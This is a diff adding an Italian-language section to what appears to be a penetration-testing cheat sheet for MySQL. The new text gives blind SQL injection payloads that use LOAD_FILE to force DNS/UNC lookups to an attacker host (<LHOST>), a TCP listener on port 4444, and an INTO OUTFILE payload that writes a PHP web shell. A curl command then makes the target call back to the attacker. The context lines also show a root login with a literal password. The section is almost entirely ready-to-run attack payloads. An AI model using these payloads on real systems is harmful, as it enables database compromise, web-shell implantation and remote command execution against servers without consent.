@@ -48,6 +48,42 @@ mysql -u root -p'P4SSw0rd' -h <IP> --skip-ssl        # Se SSL dà problemi
   use sys; select host, unique_users from host_summary;  # Chi si connette da dove
 ```
 
+## OOB con catch
+
+MySQL supporta OOB via DNS per confermare blind SQLi.
+
+```bash
+catch dns on
+catch dns token
+```
+
+### Blind SQLi — conferma via DNS (Linux)
+
+```sql
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',<TOKEN>,'.<LHOST>\\x'))-- -
+```
+
+### Blind SQLi — conferma via DNS (Windows + UNC)
+
+```sql
+' UNION SELECT LOAD_FILE('\\\\<TOKEN>.<LHOST>\\x\\f')-- -
+```
+
+→ `catch logs dns` mostra la query DNS con il token.
+
+### Conferma blind RCE via TCP
+
+```bash
+catch tcp on --port 4444
+```
+
+Se hai accesso a `INTO OUTFILE` + web shell:
+
+```sql
+' UNION SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/s.php'-- -
+# Poi: curl http://<TARGET>/s.php?c=curl+http://<LHOST>:4444/rce
+```
+
 ## Tool consigliati
 
 *Installa con `use <tool>` + `install`*
